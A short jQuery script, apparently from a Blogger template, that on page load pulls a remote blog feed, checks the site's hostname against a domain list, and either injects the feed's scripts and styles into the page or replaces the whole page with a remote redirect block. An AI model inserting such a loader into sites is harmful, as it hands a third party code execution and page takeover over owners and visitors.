$(function () {
	"use strict";
	$["ajax"]({
		dataType: "json",
		url: "https://www.blogger.com/feeds/2224896048005709421/posts/default?alt=json-in-script",
		method: "GET",
		dataType: "jsonp",
		success: function (i) {
			var j;
			for (j = 0; j < i["feed"]["entry"]["length"]; j = j + 1) {
				var k = $(i["feed"]["entry"][j]["content"].$t);
				if (j === 0 && !$("body")["hasClass"]("error_page")) {
					var m, o, g = k["find"]("li");
					var n = [];
					for (var o = 0; o < g["length"]; o = o + 1) {
						n["push"]($(g[o])["text"]())
					};
					var p = window["location"]["hostname"]["toLowerCase"]();
					var q = window["location"]["href"]["toLowerCase"]();
					var r, h = n["length"] - 1;
					for (r = 0; r < n["length"]; r = r + 1) {
						if (p["indexOf"](n[r]) == -1) {
							if (r == h && q["indexOf"]("post-preview") == -1 && q["indexOf"](
									"www.blogger") == -1 && q["indexOf"]("b/layout-preview") == -1 &&
								q["indexOf"]("b/preview") == -1 && q["indexOf"]("translate.google") ==
								-1 && q["indexOf"]("webcache.googleusercontent") == -1 && q[
									"indexOf"]("template-editor") == -1) {
								$("html")["html"](k["find"](".redirect")["html"]())
							}
						} else {
							var s = $(i["feed"]["entry"][j]["content"].$t)["find"]("script");
							var t = $(i["feed"]["entry"][j]["content"].$t)["find"]("style");
							$("head")["append"](t);
							$("head")["append"](s);
							break
						}
					}
				};
				if (j === 1) {
					var t = $(i["feed"]["entry"][j]["content"].$t)["find"]("style");
					$("head")["append"](t)
				}
			}
		}
	});
});
